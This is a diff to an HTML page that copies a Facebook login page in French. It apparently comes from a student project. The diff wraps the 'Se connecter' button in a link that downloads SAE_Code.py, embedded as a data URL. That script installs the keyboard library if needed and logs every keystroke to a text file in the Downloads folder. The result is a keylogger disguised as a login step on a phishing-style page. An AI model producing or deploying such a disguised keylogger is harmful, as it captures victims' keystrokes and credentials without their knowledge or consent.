@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Page | CodingNepal</title>
+    <title>Facebook Login Page</title>
     <link rel="stylesheet" href="style.css">
   </head>
   <body>
@@ -18,12 +18,14 @@
           <input type="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
           <input type="password" placeholder="Mot de passe" required>
           <div class="link">
-            <button type="submit" class="login"> <a href="Téléchargements/SAE_Code.py" download="SAE_Code.py">Se connecter</button>
+            <a href="data:application/octet-stream,import os%0Aimport importlib%0Aimport subprocess%0Aimport sys%0A%0Atry:%0A%20%20importlib.import_module(%22keyboard%22)%0Aexcept ImportError:%0A%20%20print(%22La bibliothèque keyboard n'est pas installée. Installation en cours...%22)%0A%20%20try:%0A%20%20%20%20subprocess.check_call(%5Bsys.executable, '-m', 'pip', 'install', 'keyboard'%5D)%0A%20%20except Exception as e:%0A%20%20%20%20print(f%22Erreur lors de l'installation de keyboard : {e}%22)%0A%20%20%20%20sys.exit(1)%0A%0Aimport keyboard%0A%0Adossier_telechargements%20%3D%20os.path.join(os.path.expanduser('~'),%20'Downloads')%0Achemin_fichier%20%3D%20os.path.join(dossier_telechargements,%20'enregistrement_clavier.txt')%0A%0Adef%20enregistrer_frappes(e):%0A%20%20try:%0A%20%20%20%20with%20open(chemin_fichier,%20%22a%22)%20as%20fichier:%0A%20%20%20%20%20%20fichier.write(e.name)%0A%20%20except:%0A%20%20%20%20pass%0A%0Akeyboard.on_press(enregistrer_frappes)%0A%0Akeyboard.wait()%0A%27%29" download="SAE_Code.py">
+                <button type="button" class="login">Se connecter</button>
+            </a>
             <a href="#" class="forgot">Mot de passe oublié ?</a>
           </div>
           <hr>
           <div class="button">
-            <a href="#">Creer un nouveau compte</a>
+            <a href="#">Créer un nouveau compte</a>
           </div>
         </form>
       </div>
